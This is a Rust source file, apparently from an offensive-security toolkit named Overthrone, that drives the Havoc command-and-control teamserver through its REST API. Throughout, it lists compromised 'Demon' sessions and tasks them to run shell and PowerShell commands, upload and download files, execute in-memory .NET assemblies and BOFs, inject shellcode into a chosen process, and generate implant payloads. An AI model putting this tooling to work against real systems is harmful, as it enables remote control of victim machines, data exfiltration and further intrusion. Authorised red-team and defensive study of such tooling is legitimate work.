//! Havoc C2 integration via REST API
//!
//! Connects to the Havoc teamserver's REST management API.
//! Supports both token-based and password-based authentication.
//!
//! Commands are tasked asynchronously to Demon agents. Each command
//! returns a task ID which is then polled until output is available.
//!
//! Reference: <https://github.com/HavocFramework/Havoc>

use super::{
    C2Auth, C2Channel, C2Config, C2Framework, C2Listener, C2Session, C2TaskResult,
    ImplantRequest, SessionType,
};
use crate::error::{OverthroneError, Result};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;

// ── Response types ────────────────────────────────────────────────────

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct HavocCommandResp {
    task_id: Option<String>,
    error: Option<String>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct HavocTaskResultResp {
    task_id: String,
    status: String,
    output: Option<String>,
    error: Option<String>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "PascalCase")]
struct HavocServerInfoResp {
    version: Option<String>,
    listeners_count: Option<u32>,
    demons_count: Option<u32>,
}

// ── Channel ───────────────────────────────────────────────────────────

pub struct HavocChannel {
    /// Shared HTTP client (reuses connections)
    client: Option<reqwest::Client>,
    connected: bool,
    base_url: String,
    token: String,
    server_info: HashMap<String, String>,
}

impl Default for HavocChannel {
    fn default() -> Self {
        Self::new()
    }
}

impl HavocChannel {
    pub fn new() -> Self {
        Self {
            client: None,
            connected: false,
            base_url: String::new(),
            token: String::new(),
            server_info: HashMap::new(),
        }
    }

    /// Build or get the shared HTTP client.
    fn http_client(&self) -> Result<&reqwest::Client> {
        self.client
            .as_ref()
            .ok_or_else(|| OverthroneError::C2("Not connected".into()))
    }

    /// `GET {base_url}{endpoint}` with bearer auth.
    async fn api_get(&self, endpoint: &str) -> Result<reqwest::Response> {
        let url = format!("{}{}", self.base_url, endpoint);
        let resp = self
            .http_client()?
            .get(&url)
            .bearer_auth(&self.token)
            .send()
            .await
            .map_err(|e| OverthroneError::C2(format!("GET {url}: {e}")))?;

        Self::check_response(resp).await
    }

    /// `POST {base_url}{endpoint}` with bearer auth and JSON body.
    async fn api_post<T: Serialize + ?Sized>(
        &self,
        endpoint: &str,
        body: &T,
    ) -> Result<reqwest::Response> {
        let url = format!("{}{}", self.base_url, endpoint);
        let resp = self
            .http_client()?
            .post(&url)
            .bearer_auth(&self.token)
            .json(body)
            .send()
            .await
            .map_err(|e| OverthroneError::C2(format!("POST {url}: {e}")))?;

        Self::check_response(resp).await
    }

    /// Check HTTP response status, returning structured errors for 4xx/5xx.
    async fn check_response(resp: reqwest::Response) -> Result<reqwest::Response> {
        let status = resp.status();
        if status == reqwest::StatusCode::UNAUTHORIZED
            || status == reqwest::StatusCode::FORBIDDEN
        {
            return Err(OverthroneError::C2(
                "Havoc API authentication failed — check token/password".into(),
            ));
        }
        if status.is_client_error() || status.is_server_error() {
            let body = resp.text().await.unwrap_or_default();
            return Err(OverthroneError::C2(format!("HTTP {status}: {body}")));
        }
        Ok(resp)
    }

    /// Task a Demon and poll for output until complete or timeout (5 min).
    async fn task_demon(
        &self,
        agent_id: &str,
        command: &str,
        extra: serde_json::Value,
    ) -> Result<C2TaskResult> {
        let start = std::time::Instant::now();

        let mut body = serde_json::json!({
            "AgentID": agent_id,
            "Command": command,
        });
        // Merge extra fields
        if let (Some(base), Some(ext)) = (body.as_object_mut(), extra.as_object()) {
            for (k, v) in ext {
                base.insert(k.clone(), v.clone());
            }
        }

        let resp = self.api_post("/demons/command", &body).await?;
        let cmd_resp: HavocCommandResp = resp
            .json()
            .await
            .map_err(|e| OverthroneError::C2(format!("Parse command response: {e}")))?;

        if let Some(err) = &cmd_resp.error
            && !err.is_empty() {
                return Err(OverthroneError::C2(format!("Havoc error: {err}")));
            }

        let task_id = cmd_resp
            .task_id
            .unwrap_or_else(|| format!("havoc-{}", uuid::Uuid::new_v4().as_simple()));

        // Poll for result
        let timeout = Duration::from_secs(300);
        loop {
            if start.elapsed() > timeout {
                return Ok(C2TaskResult {
                    task_id: task_id.clone(),
                    success: false,
                    output: String::new(),
                    error: "Timeout waiting for Demon callback".into(),
                    raw_data: None,
                    duration: start.elapsed(),
                });
            }

            let poll_url = format!("/demons/{agent_id}/tasks/{task_id}");
            if let Ok(resp) = self.api_get(&poll_url).await
                && let Ok(task) = resp.json::<HavocTaskResultResp>().await {
                    if task.status == "completed" || task.status == "done" {
                        return Ok(C2TaskResult {
                            task_id: task.task_id,
                            success: task.error.as_deref().unwrap_or("").is_empty(),
                            output: task.output.unwrap_or_default(),
                            error: task.error.unwrap_or_default(),
                            raw_data: None,
                            duration: start.elapsed(),
                        });
                    }
                    if task.status == "error" {
                        return Ok(C2TaskResult {
                            task_id: task.task_id,
                            success: false,
                            output: task.output.unwrap_or_default(),
                            error: task
                                .error
                                .unwrap_or_else(|| "Unknown task error".into()),
                            raw_data: None,
                            duration: start.elapsed(),
                        });
                    }
                }

            tokio::time::sleep(Duration::from_secs(2)).await;
        }
    }
}

// ── C2Channel implementation ──────────────────────────────────────────

#[async_trait]
impl C2Channel for HavocChannel {
    fn framework(&self) -> C2Framework {
        C2Framework::Havoc
    }

    async fn connect(&mut self, config: &C2Config) -> Result<()> {
        let scheme = if config.tls { "https" } else { "http" };
        self.base_url = format!("{scheme}://{}:{}/api", config.host, config.port);

        // Build shared HTTP client
        let mut builder = reqwest::Client::builder()
            .timeout(Duration::from_secs(30))
            .pool_max_idle_per_host(4);

        if config.tls {
            builder = builder.danger_accept_invalid_certs(config.tls_skip_verify);
        }

        self.client = Some(
            builder
                .build()
                .map_err(|e| OverthroneError::C2(format!("HTTP client build: {e}")))?,
        );

        // Authenticate
        self.token = match &config.auth {
            C2Auth::Token { token } => token.clone(),
            C2Auth::Password { password } => {
                let auth_body = serde_json::json!({
                    "username": "overthrone",
                    "password": password,
                });

                let resp = self.api_post("/auth/login", &auth_body).await?;
                let parsed: serde_json::Value = resp
                    .json()
                    .await
                    .map_err(|e| OverthroneError::C2(format!("Auth parse: {e}")))?;

                parsed["token"]
                    .as_str()
                    .ok_or_else(|| OverthroneError::C2("No token in auth response".into()))?
                    .to_string()
            }
            _ => {
                return Err(OverthroneError::C2(
                    "Havoc requires Token or Password authentication".into(),
                ));
            }
        };

        // Fetch server info
        if let Ok(resp) = self.api_get("/server/info").await
            && let Ok(info) = resp.json::<HavocServerInfoResp>().await {
                if let Some(ver) = info.version {
                    self.server_info.insert("version".into(), ver);
                }
                if let Some(lc) = info.listeners_count {
                    self.server_info
                        .insert("listeners_count".into(), lc.to_string());
                }
                if let Some(dc) = info.demons_count {
                    self.server_info
                        .insert("demons_count".into(), dc.to_string());
                }
            }

        self.connected = true;
        log::info!("[c2:havoc] Connected to Havoc at {}", self.base_url);
        Ok(())
    }

    async fn disconnect(&mut self) -> Result<()> {
        self.client = None;
        self.connected = false;
        self.token.clear();
        log::info!("[c2:havoc] Disconnected");
        Ok(())
    }

    fn is_connected(&self) -> bool {
        self.connected
    }

    async fn list_sessions(&self) -> Result<Vec<C2Session>> {
        let resp = self.api_get("/demons").await?;
        let demons: serde_json::Value = resp
            .json()
            .await
            .map_err(|e| OverthroneError::C2(format!("Parse demons: {e}")))?;

        let mut sessions = Vec::new();
        if let Some(arr) = demons.as_array() {
            for d in arr {
                sessions.push(C2Session {
                    id: d["AgentID"].as_str().unwrap_or("").to_string(),
                    hostname: d["Computer"].as_str().unwrap_or("").to_string(),
                    ip: d["ExternalIP"].as_str().unwrap_or("").to_string(),
                    username: d["User"].as_str().unwrap_or("").to_string(),
                    domain: d["Domain"].as_str().unwrap_or("").to_string(),
                    process: d["Process"].as_str().unwrap_or("").to_string(),
                    pid: d["PID"].as_u64().unwrap_or(0) as u32,
                    arch: d["Arch"].as_str().unwrap_or("").to_string(),
                    os: d["OS"].as_str().unwrap_or("").to_string(),
                    elevated: d["Elevated"].as_bool().unwrap_or(false),
                    session_type: SessionType::Demon,
                    last_seen: d["LastSeen"].as_str().unwrap_or("").to_string(),
                    sleep_interval: d["Sleep"].as_u64().map(Duration::from_secs),
                    metadata: HashMap::new(),
                });
            }
        }

        Ok(sessions)
    }

    async fn get_session(&self, session_id: &str) -> Result<C2Session> {
        self.list_sessions()
            .await?
            .into_iter()
            .find(|s| s.id == session_id)
            .ok_or_else(|| OverthroneError::C2(format!("Demon {session_id} not found")))
    }

    async fn exec_command(
        &self,
        session_id: &str,
        command: &str,
    ) -> Result<C2TaskResult> {
        self.task_demon(
            session_id,
            "shell",
            serde_json::json!({ "Args": command }),
        )
        .await
    }

    async fn exec_powershell(
        &self,
        session_id: &str,
        script: &str,
    ) -> Result<C2TaskResult> {
        self.task_demon(
            session_id,
            "powershell",
            serde_json::json!({ "Args": script }),
        )
        .await
    }

    async fn upload_file(
        &self,
        session_id: &str,
        local_data: &[u8],
        remote_path: &str,
    ) -> Result<C2TaskResult> {
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            local_data,
        );
        self.task_demon(
            session_id,
            "upload",
            serde_json::json!({
                "Path": remote_path,
                "Data": encoded,
            }),
        )
        .await
    }

    async fn download_file(
        &self,
        session_id: &str,
        remote_path: &str,
    ) -> Result<C2TaskResult> {
        self.task_demon(
            session_id,
            "download",
            serde_json::json!({ "Path": remote_path }),
        )
        .await
    }

    async fn execute_assembly(
        &self,
        session_id: &str,
        assembly_data: &[u8],
        args: &str,
    ) -> Result<C2TaskResult> {
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            assembly_data,
        );
        self.task_demon(
            session_id,
            "dotnet",
            serde_json::json!({
                "Assembly": encoded,
                "Args": args,
            }),
        )
        .await
    }

    async fn execute_bof(
        &self,
        session_id: &str,
        bof_data: &[u8],
        args: &[u8],
    ) -> Result<C2TaskResult> {
        let bof_encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            bof_data,
        );
        let args_encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            args,
        );
        self.task_demon(
            session_id,
            "inline-execute",
            serde_json::json!({
                "BOF": bof_encoded,
                "Args": args_encoded,
            }),
        )
        .await
    }

    async fn shellcode_inject(
        &self,
        session_id: &str,
        shellcode: &[u8],
        target_pid: u32,
    ) -> Result<C2TaskResult> {
        let sc_encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            shellcode,
        );
        self.task_demon(
            session_id,
            "inject",
            serde_json::json!({
                "Shellcode": sc_encoded,
                "PID": target_pid,
            }),
        )
        .await
    }

    async fn deploy_implant(&self, request: &ImplantRequest) -> Result<C2TaskResult> {
        let body = serde_json::json!({
            "Listener": request.listener,
            "Arch": request.arch,
            "Format": if request.staged { "staged" } else { "exe" },
            "Target": request.target,
        });

        let start = std::time::Instant::now();
        let resp = self.api_post("/payload/generate", &body).await?;
        let raw = resp.bytes().await.map_err(|e| {
            OverthroneError::C2(format!("Read payload data: {e}"))
        })?;

        Ok(C2TaskResult {
            task_id: format!("havoc-deploy-{}", uuid::Uuid::new_v4().as_simple()),
            success: !raw.is_empty(),
            output: format!(
                "Generated Demon payload ({} bytes) for {}",
                raw.len(),
                request.target
            ),
            error: String::new(),
            raw_data: Some(raw.to_vec()),
            duration: start.elapsed(),
        })
    }

    async fn list_listeners(&self) -> Result<Vec<C2Listener>> {
        let resp = self.api_get("/listeners").await?;
        let parsed: serde_json::Value = resp.json().await.unwrap_or_default();

        let mut listeners = Vec::new();
        if let Some(arr) = parsed.as_array() {
            for l in arr {
                listeners.push(C2Listener {
                    name: l["Name"].as_str().unwrap_or("").to_string(),
                    listener_type: l["Protocol"].as_str().unwrap_or("").to_string(),
                    host: l["Host"].as_str().unwrap_or("").to_string(),
                    port: l["Port"].as_u64().unwrap_or(0) as u16,
                    active: l["Status"].as_str().unwrap_or("") == "active",
                });
            }
        }

        Ok(listeners)
    }

    async fn server_info(&self) -> Result<HashMap<String, String>> {
        // Refresh from API
        let mut info = self.server_info.clone();

        if let Ok(resp) = self.api_get("/server/info").await
            && let Ok(si) = resp.json::<HavocServerInfoResp>().await {
                if let Some(v) = si.version {
                    info.insert("version".into(), v);
                }
                if let Some(lc) = si.listeners_count {
                    info.insert("listeners_count".into(), lc.to_string());
                }
                if let Some(dc) = si.demons_count {
                    info.insert("demons_count".into(), dc.to_string());
                }
            }

        Ok(info)
    }
}
